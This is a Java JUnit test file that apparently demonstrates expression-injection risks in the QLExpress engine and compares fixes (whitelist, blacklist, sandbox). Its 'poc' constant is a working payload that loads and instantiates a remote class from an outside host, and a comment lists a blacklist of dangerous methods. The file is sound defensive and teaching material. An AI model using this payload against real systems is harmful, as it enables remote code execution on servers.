package org.test;

import com.ql.util.express.DefaultContext;
import com.ql.util.express.ExpressRunner;
import com.ql.util.express.IExpressContext;
import com.ql.util.express.config.QLExpressRunStrategy;
import org.junit.Test;

/**
 * <a href="https://github.com/alibaba/QLExpress">QLExpress</a> security test cases.
 */
public class QLExpressTest {

    private static final String poc = "url = 'http://sb.dog:8888/'; classLoader = new java.net.URLClassLoader([new java.net.URL(url)]);classLoader.loadClass('Hello').newInstance();";

    /**
     * basic usage
     */
    @Test
    public void basicUsage() throws Exception{
        ExpressRunner runner = new ExpressRunner();
        IExpressContext<String, Object> context = new DefaultContext<>();
        context.put("a", 1);
        context.put("b", 2);
        Object r = runner.execute("a+b", context, null, true, false);
        System.out.println(r);  // print 3
    }

    /**
     * Test case of /qlexpress/vuln1. Use URLClassLoader to load evil class.
     */
    @Test
    public void vuln1() throws Exception {
        System.out.println(poc);
        ExpressRunner runner = new ExpressRunner();
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r = runner.execute(poc, context, null, true, false);
        System.out.println(r);
    }

    /**
     * fix method by using class and method whitelist.
     */
    @Test
    public void sec01() throws Exception {
        System.out.println(poc);
        ExpressRunner runner = new ExpressRunner();
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        QLExpressRunStrategy.addSecureMethod(String.class, "length");
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r1 = runner.execute("'abc'.length()", context, null, true, false);
        System.out.println(r1);
        Object r2 = runner.execute(poc, context, null, true, false);
        System.out.println(r2);
    }

    /**
     * <p>Fix method by using class and method blacklist. It may exist bypass. </p>
     *
     * <p>Default blacklist:
     *  <ul>
     *     <li>System.class.getName() + ".exit"</li>
     *     <li>ProcessBuilder.class.getName() + ".start"</li>
     *     <li>Method.class.getName() + ".invoke"</li>
     *     <li>Class.class.getName() + ".forName"</li>
     *     <li>ClassLoader.class.getName() + ".loadClass"</li>
     *     <li>ClassLoader.class.getName() + ".findClass"</li>
     *     <li>ClassLoader.class.getName() + ".defineClass"</li>
     *     <li>ClassLoader.class.getName() + ".getSystemClassLoader"</li>
     *     <li>javax.naming.InitialContext.lookup</li>
     *     <li>com.sun.rowset.JdbcRowSetImpl.setDataSourceName</li>
     *     <li>com.sun.rowset.JdbcRowSetImpl.setAutoCommit</li>
     *     <li>QLExpressRunStrategy.class.getName() + ".setForbidInvokeSecurityRiskMethods"</li>
     *     <li>jdk.jshell.JShell.create</li>
     *     <li>javax.script.ScriptEngineManager.getEngineByName</li>
     *     <li>org.springframework.jndi.JndiLocatorDelegate.lookup</li>
     *  </ul>
     * </p>
     */
    @Test
    public void sec02() throws Exception {
        System.out.println(poc);
        ExpressRunner runner = new ExpressRunner();
        QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r = runner.execute(poc, context, null, true, false);
        System.out.println(r);
    }


    /**
     * <p>Fix method by using sandbox. </p>
     */
    @Test
    public void sec03() throws Exception {
        System.out.println(poc);
        ExpressRunner runner = new ExpressRunner();
        QLExpressRunStrategy.setSandBoxMode(true);
        IExpressContext<String, Object> context = new DefaultContext<>();
        Object r = runner.execute(poc, context, null, true, false);
        System.out.println(r);
    }
}
